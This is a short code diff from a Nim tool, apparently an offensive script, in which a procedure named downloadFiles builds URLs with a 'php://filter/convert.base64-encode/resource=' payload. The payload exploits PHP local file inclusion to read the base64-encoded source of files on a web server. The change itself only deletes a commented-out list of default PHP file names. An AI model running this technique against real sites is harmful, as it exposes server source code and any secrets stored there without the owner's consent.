@@ -55,7 +55,6 @@ proc downloadFiles(url: string, files: string): void =
   var client = newHTTPClient()
   let testUrl = split(url, '=')[0]
   let phpfilter = "=php://filter/convert.base64-encode/resource="
-  #var files = @["index.php", "login.php", "footer.php", "profile.php", "header.php", "upload.php", "image.php", "logout.php"]
   var filesSeq = newSeq[string]()
   filesSeq = files.split(",")
   var foundfiles = newSeq[string]()
